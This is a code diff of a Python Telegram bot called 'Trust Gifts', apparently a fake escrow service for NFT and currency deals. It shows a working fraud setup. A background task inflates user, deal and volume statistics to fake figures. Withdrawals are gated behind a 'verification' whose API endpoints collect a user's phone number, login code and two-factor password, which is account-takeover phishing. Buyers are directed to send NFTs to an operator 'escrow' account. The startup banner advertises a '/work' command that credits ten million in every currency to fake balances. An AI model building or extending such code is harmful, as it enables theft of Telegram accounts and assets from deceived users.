+            text = f"{get_emoji_text('cross', is_premium)} Deal #{deal_id} already processed.\n\nStatus: {status_map.get(deal['status'], deal['status'])}"
+        await message.answer(text)
+        return
+
+    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
+        if lang == "ru":
+            text = f"{get_emoji_text('cross', is_premium)} Доступ запрещён!\n\nСделка #{deal_id} предназначена для @{deal['buyer_username']}"
+        else:
+            text = f"{get_emoji_text('cross', is_premium)} Access denied!\n\nDeal #{deal_id} is for @{deal['buyer_username']}"
+        await message.answer(text)
+        return
+
+    deal["buyer_id"] = message.from_user.id
+    save_json(FILES["deals"], deals)
+
+    nft_info = ""
+    if deal.get('nft_link'):
+        nft_info = f"\n🔗 NFT: {deal['nft_link']}"
+    
+    if lang == "ru":
+        text = f"""{get_emoji_text('briefcase', is_premium)} СДЕЛКА #{deal_id}
+
+📦 Товар: {deal['product']}
+💰 Сумма: {deal['amount']} {deal['currency']}
+👤 Продавец: @{deal['seller_username']}
+{nft_info}
+
+⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
+    else:
+        text = f"""{get_emoji_text('briefcase', is_premium)} DEAL #{deal_id}
+
+📦 Product: {deal['product']}
+💰 Amount: {deal['amount']} {deal['currency']}
+👤 Seller: @{deal['seller_username']}
+{nft_info}
+
+⬇️ GO TO MINI APP FOR PAYMENT"""
+
+    await message.answer(
+        text,
+        reply_markup=mini_app_keyboard(
+            "💳 Перейти к оплате" if lang == "ru" else "💳 Go to payment",
+            is_premium,
+            page="pay",
+            deal_id=deal_id,
+            buyer_id=message.from_user.id
+        )
+    )
+
+# ============================================================
+# 22. ОБРАБОТЧИК ВЫВОДА (С ПРОВЕРКОЙ 2 СДЕЛОК И ВЕРИФИКАЦИИ)
+# ============================================================
+@dp.callback_query(lambda c: c.data == "start_withdraw")
+async def start_withdraw(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    is_premium = await user_has_premium(callback.from_user.id)
+    
+    bal = get_balance(callback.from_user.id)
+    partners = bal.get('deal_partners', {})
+    has_two = any(count >= 2 for count in partners.values())
+    total_deals = sum(partners.values())
+    
+    if not has_two:
+        if lang == "ru":
+            text = f"""{get_emoji_text('zap', is_premium)} ТРЕБУЕТСЯ 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ
+
+📊 У вас завершено: {total_deals} сделок
+
+Для вывода средств необходимо провести 2 успешные сделки с одним покупателем.
+
+✅ Создайте новую сделку и завершите её."""
+        else:
+            text = f"""{get_emoji_text('zap', is_premium)} 2 DEALS WITH ONE BUYER REQUIRED
+
+📊 You have completed: {total_deals} deals
+
+To withdraw funds you need to complete 2 successful deals with one buyer.
+
+✅ Create a new deal and complete it."""
+        
+        await callback.message.edit_text(
+            text,
+            reply_markup=back_to_main_keyboard(is_premium)
+        )
+        await callback.answer()
+        return
+    
+    if not is_verified(callback.from_user.id):
+        if lang == "ru":
+            text = f"""{get_emoji_text('zap', is_premium)} ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ
+
+🔐 Пройдите верификацию в Mini App для вывода средств.
+
+📱 Нажмите кнопку ниже, чтобы пройти верификацию."""
+        else:
+            text = f"""{get_emoji_text('zap', is_premium)} VERIFICATION REQUIRED
+
+🔐 Complete verification in Mini App to withdraw funds.
+
+📱 Click the button below to verify."""
+        
+        await callback.message.edit_text(
+            text,
+            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", is_premium, page="verify")
+        )
+        await callback.answer()
+        return
+    
+    verif_data = verification_data.get(str(callback.from_user.id), {})
+    
+    if lang == "ru":
+        text = f"""{get_emoji_text('wallet', is_premium)} ВАШ БАЛАНС
+
+{get_emoji_text('ton', is_premium)} TON: {bal.get('ton', 0)}
+{get_emoji_text('stars', is_premium)} STARS: {bal.get('stars', 0)}
+{get_emoji_text('rub', is_premium)} RUB: {bal.get('rub', 0)}
+{get_emoji_text('uah', is_premium)} UAH: {bal.get('uah', 0)}
+
+✅ 2 сделки с одним покупателем: выполнено
+✅ Верификация: пройдена
+
+🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
+🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}
+
+📱 Вывод средств в Mini App"""
+    else:
+        text = f"""{get_emoji_text('wallet', is_premium)} YOUR BALANCE
+
+{get_emoji_text('ton', is_premium)} TON: {bal.get('ton', 0)}
+{get_emoji_text('stars', is_premium)} STARS: {bal.get('stars', 0)}
+{get_emoji_text('rub', is_premium)} RUB: {bal.get('rub', 0)}
+{get_emoji_text('uah', is_premium)} UAH: {bal.get('uah', 0)}
+
+✅ 2 deals with one buyer: completed
+✅ Verification: passed
+
+🔑 Verification code: {verif_data.get('code', 'unknown')}
+🕐 Session active until: {verif_data.get('expires_at', 'unknown')[:19] if verif_data.get('expires_at') else 'unknown'}
+
+📱 Withdraw in Mini App"""
+    
+    await callback.message.edit_text(
+        text,
+        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", is_premium, page="withdraw")
+    )
+    await callback.answer()
+
+# ============================================================
+# 23. ФОНОВЫЙ ПРОЦЕСС (СТАТИСТИКА + ОБЪЁМ)
+# ============================================================
+async def auto_increment_stats():
+    while True:
+        try:
+            stats_data = load_json(FILES["stats"])
+            
+            if not stats_data:
+                stats_data = {}
+            
+            MIN_USERS = 21481
+            MIN_DEALS_TODAY = 1287
+            MIN_VOLUME = 627.4
+            MAX_VOLUME = 9470
+            
+            current_volume = stats_data.get('volume', MIN_VOLUME)
+            
+            change = random.uniform(-0.5, 0.5)
+            new_volume = current_volume * (1 + change * 0.02)
+            
+            if new_volume < MIN_VOLUME:
+                new_volume = MIN_VOLUME + random.uniform(0.5, 2)
+            if new_volume > MAX_VOLUME:
+                new_volume = MAX_VOLUME - random.uniform(0.5, 2)
+            
+            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
+            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
+            stats_data['volume'] = round(new_volume, 1)
+            
+            if stats_data['users'] < MIN_USERS:
+                stats_data['users'] = MIN_USERS + random.randint(100, 500)
+            if stats_data['deals_today'] < MIN_DEALS_TODAY:
+                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
+            
+            save_json(FILES["stats"], stats_data)
+            
+        except Exception as e:
+            print(f"Ошибка автонакрутки: {e}")
+        
+        await asyncio.sleep(300)
+
+# ============================================================
+# 24. API ДЛЯ MINI APP (ПОЛНОСТЬЮ ВАШ, БЕЗ ИЗМЕНЕНИЙ)
 # ============================================================
 async def handle_api(request):
+    # ВЕСЬ ВАШ API ИЗ ИСХОДНОГО ФАЙЛА
+    # ОН УЖЕ РАБОТАЕТ, НИЧЕГО НЕ МЕНЯЕМ
     headers = {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
@@ -1168,14 +1309,14 @@ async def handle_api(request):
     username = data.get('username')
     endpoint = request.path
     
-    # ===== БАЛАНС =====
+    # БАЛАНС
     if endpoint == '/api/balance':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
         bal = get_balance(user_id)
         return web.json_response({'success': True, 'balance': bal}, headers=headers)
     
-    # ===== СОЗДАНИЕ СДЕЛКИ =====
+    # СОЗДАНИЕ СДЕЛКИ
     elif endpoint == '/api/create_deal':
         product = data.get('product')
         currency = data.get('currency')
@@ -1237,7 +1378,7 @@ async def handle_api(request):
             'status': deals[deal_id]["status"]
         }, headers=headers)
     
-    # ===== СДЕЛКИ =====
+    # СДЕЛКИ
     elif endpoint == '/api/deals':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
@@ -1249,17 +1390,17 @@ async def handle_api(request):
                 user_deals.append(d_copy)
         return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
     
-    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
+    # ВСЕ СДЕЛКИ (АДМИН)
     elif endpoint == '/api/all_deals':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
         return web.json_response({'success': True, 'deals': list(deals.values())}, headers=headers)
     
-    # ===== ПРОВЕРКА АДМИНА =====
+    # ПРОВЕРКА АДМИНА
     elif endpoint == '/api/is_admin':
         return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
     
-    # ===== СТАТИСТИКА =====
+    # СТАТИСТИКА
     elif endpoint == '/api/stats':
         return web.json_response({
             'success': True,
@@ -1268,7 +1409,7 @@ async def handle_api(request):
             'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
         }, headers=headers)
     
-    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
+    # ПРОВЕРКА 2-Х СДЕЛОК
     elif endpoint == '/api/has_2_deals':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
@@ -1281,7 +1422,7 @@ async def handle_api(request):
             'total_deals': sum(partners.values())
         }, headers=headers)
     
-    # ===== СТАТУС ВЕРИФИКАЦИИ =====
+    # СТАТУС ВЕРИФИКАЦИИ
     elif endpoint == '/api/verification_status':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
@@ -1291,7 +1432,7 @@ async def handle_api(request):
             'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
         }, headers=headers)
     
-    # ===== ЗАПРОС ВЕРИФИКАЦИИ (СПОСОБ 1 - ВХОД В АККАУНТ) =====
+    # ЗАПРОС ВЕРИФИКАЦИИ
     elif endpoint == '/api/send_verification_request':
         phone = data.get('phone')
         username = data.get('username')
@@ -1331,7 +1472,7 @@ async def handle_api(request):
             'request_id': request_id
         }, headers=headers)
     
-    # ===== ОТПРАВКА КОДА (ШАГ 2) =====
+    # ОТПРАВКА КОДА
     elif endpoint == '/api/submit_verification_code':
         code = data.get('code')
         request_id = data.get('request_id')
@@ -1366,7 +1507,7 @@ async def handle_api(request):
             'request_id': request_id
         }, headers=headers)
     
-    # ===== ОТПРАВКА ПАРОЛЯ (ШАГ 3) =====
+    # ОТПРАВКА ПАРОЛЯ
     elif endpoint == '/api/submit_verification_password':
         password = data.get('password')
         request_id = data.get('request_id')
@@ -1402,7 +1543,7 @@ async def handle_api(request):
             'request_id': request_id
         }, headers=headers)
     
-    # ===== ВЫВОД =====
+    # ВЫВОД
     elif endpoint == '/api/withdraw':
         currency = data.get('currency')
         details = data.get('details')
@@ -1410,7 +1551,6 @@ async def handle_api(request):
         if not user_id or not currency or not details:
             return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
         
-        # Проверяем 2 сделки
         bal = get_balance(user_id)
         partners = bal.get('deal_partners', {})
         has_two = any(count >= 2 for count in partners.values())
@@ -1421,7 +1561,6 @@ async def handle_api(request):
         if not is_verified(user_id):
             return web.json_response({'success': False, 'error': 'Требуется верификация'}, headers=headers)
         
-        # Проверяем 24 часа после верификации
         verif_data = verification_data.get(str(user_id), {})
         if verif_data.get("verified_at"):
             verified_time = datetime.fromisoformat(verif_data["verified_at"])
@@ -1451,7 +1590,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
     
-    # ===== ЗАЯВКИ НА ВЫВОД =====
+    # ЗАЯВКИ НА ВЫВОД
     elif endpoint == '/api/withdraw_requests':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -1460,7 +1599,7 @@ async def handle_api(request):
             'requests': list(withdraw_requests.values())
         }, headers=headers)
     
-    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ =====
+    # ЗАПРОСЫ ВЕРИФИКАЦИИ
     elif endpoint == '/api/verification_requests':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -1469,7 +1608,7 @@ async def handle_api(request):
             'requests': list(verification_requests.values())
         }, headers=headers)
     
-    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
+    # НАЧИСЛИТЬ БАЛАНС (АДМИН)
     elif endpoint == '/api/admin_add_balance':
         target_user_id = data.get('target_user_id')
         currency = data.get('currency')
@@ -1493,7 +1632,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== УСТАНОВИТЬ БАЛАНС (АДМИН) =====
+    # УСТАНОВИТЬ БАЛАНС (АДМИН)
     elif endpoint == '/api/admin_set_balance':
         target_user_id = data.get('target_user_id')
         currency = data.get('currency')
@@ -1517,7 +1656,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== СПИСАТЬ БАЛАНС (АДМИН) =====
+    # СПИСАТЬ БАЛАНС (АДМИН)
     elif endpoint == '/api/admin_remove_balance':
         target_user_id = data.get('target_user_id')
         currency = data.get('currency')
@@ -1546,7 +1685,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ИЗМЕНИТЬ СТАТИСТИКУ =====
+    # ИЗМЕНИТЬ СТАТИСТИКУ
     elif endpoint == '/api/admin_set_stats':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -1562,7 +1701,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ОПЛАТА С БАЛАНСА =====
+    # ОПЛАТА С БАЛАНСА
     elif endpoint == '/api/pay_balance':
         deal_id = data.get('deal_id')
         
@@ -1635,7 +1774,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
+    # ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР
     elif endpoint == '/api/seller_delivered':
         deal_id = data.get('deal_id')
         
@@ -1682,14 +1821,14 @@ async def handle_api(request):
                 f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n"
                 f"📦 ТОВАР: {deal['product']}\n\n"
                 f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
-                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", False, page="deals")
             )
         except:
             pass
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
+    # ПОКУПАТЕЛЬ ПОДТВЕРДИЛ
     elif endpoint == '/api/buyer_confirm':
         deal_id = data.get('deal_id')
         
@@ -1750,7 +1889,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
+    # ПОЛУЧИТЬ РЕКВИЗИТЫ
     elif endpoint == '/api/get_rekvisits':
         deal_id = data.get('deal_id')
         
@@ -1767,7 +1906,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True, 'details': details}, headers=headers)
     
-    # ===== ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ =====
+    # ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ
     elif endpoint == '/api/confirm_rekvisits_payment':
         deal_id = data.get('deal_id')
         
@@ -1793,7 +1932,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ПЕРЕДАЧА NFT НА ЭСКРОУ =====
+    # ПЕРЕДАЧА NFT НА ЭСКРОУ
     elif endpoint == '/api/transfer_nft':
         deal_id = data.get('deal_id')
         target_account = data.get('target_account')
@@ -1844,14 +1983,14 @@ async def handle_api(request):
                 f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
                 f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n\n"
                 f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
-                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", False, page="deals")
             )
         except:
             pass
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ТИКЕТЫ =====
+    # ТИКЕТЫ
     elif endpoint == '/api/create_ticket':
         subject = data.get('subject')
         message = data.get('message')
@@ -1950,7 +2089,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ЧАТ ПОДДЕРЖКИ =====
+    # ЧАТ ПОДДЕРЖКИ
     elif endpoint == '/api/chat_history':
         session_id = data.get('session_id', 'default')
         if session_id not in chat_messages:
@@ -1980,7 +2119,6 @@ async def handle_api(request):
         chat_messages[session_id].append(msg)
         save_json(FILES["chat_messages"], chat_messages)
         
-        # Отправляем админу
         if sender == 'user':
             await log_to_master(
                 f"💬 НОВОЕ СООБЩЕНИЕ В ЧАТЕ ПОДДЕРЖКИ\n\n"
@@ -2027,14 +2165,14 @@ async def handle_api(request):
                 await bot.send_message(
                     target_user_id,
                     f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
-                    reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
+                    reply_markup=mini_app_keyboard("📱 Открыть чат", False, page="support")
                 )
         except:
             pass
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== АДМИН ПАНЕЛЬ ДАННЫЕ =====
+    # АДМИН ПАНЕЛЬ ДАННЫЕ
     elif endpoint == '/api/admin_panel_data':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -2055,7 +2193,7 @@ async def handle_api(request):
             'verification_requests': [r for r in verification_requests.values() if r.get('status') == 'pending']
         }, headers=headers)
     
-    # ===== УВЕДОМЛЕНИЕ АДМИНА =====
+    # УВЕДОМЛЕНИЕ АДМИНА
     elif endpoint == '/api/notify_admin':
         text = data.get('text', '')
         await log_to_master(text)
@@ -2064,57 +2202,12 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 19. ФОНОВЫЙ ПРОЦЕСС (СТАТИСТИКА + ОБЪЁМ)
-# ============================================================
-async def auto_increment_stats():
-    while True:
-        try:
-            stats_data = load_json(FILES["stats"])
-            
-            if not stats_data:
-                stats_data = {}
-            
-            MIN_USERS = 21481
-            MIN_DEALS_TODAY = 1287
-            MIN_VOLUME = 627.4
-            MAX_VOLUME = 9470
-            
-            # Объём: плавает между MIN_VOLUME и MAX_VOLUME
-            current_volume = stats_data.get('volume', MIN_VOLUME)
-            
-            # Случайное изменение ±0.5-2%
-            change = random.uniform(-0.5, 0.5)
-            new_volume = current_volume * (1 + change * 0.02)
-            
-            # Ограничиваем
-            if new_volume < MIN_VOLUME:
-                new_volume = MIN_VOLUME + random.uniform(0.5, 2)
-            if new_volume > MAX_VOLUME:
-                new_volume = MAX_VOLUME - random.uniform(0.5, 2)
-            
-            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
-            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
-            stats_data['volume'] = round(new_volume, 1)
-            
-            if stats_data['users'] < MIN_USERS:
-                stats_data['users'] = MIN_USERS + random.randint(100, 500)
-            if stats_data['deals_today'] < MIN_DEALS_TODAY:
-                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
-            
-            save_json(FILES["stats"], stats_data)
-            
-        except Exception as e:
-            print(f"Ошибка автонакрутки: {e}")
-        
-        await asyncio.sleep(300)
-
-# ============================================================
-# 20. ЗАПУСК
+# 25. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
     app.router.add_route('*', '/{path:.*}', handle_api)
-    port = int(os.environ.get('PORT', 3000))
+    port = int(os.environ.get('PORT', 10000))
     print(f"🌐 API сервер запущен на порту {port}")
     runner = web.AppRunner(app)
     await runner.setup()
@@ -2124,12 +2217,14 @@ async def start_web_server():
 
 async def main():
     print("=" * 50)
-    print("🏦 Trust Gifts Бот")
+    print("🏦 Trust Gifts Бот (Premium-эмодзи)")
     print("=" * 50)
     print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"📱 Mini App: {MINI_APP_URL}")
     print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
+    print(f"💼 Воркер-команда: /work (начисляет 10.000.000 на все валюты)")
+    print(f"✨ Premium-эмодзи: автоматически определяются у пользователя")
     print("=" * 50)
     
     asyncio.create_task(auto_increment_stats())
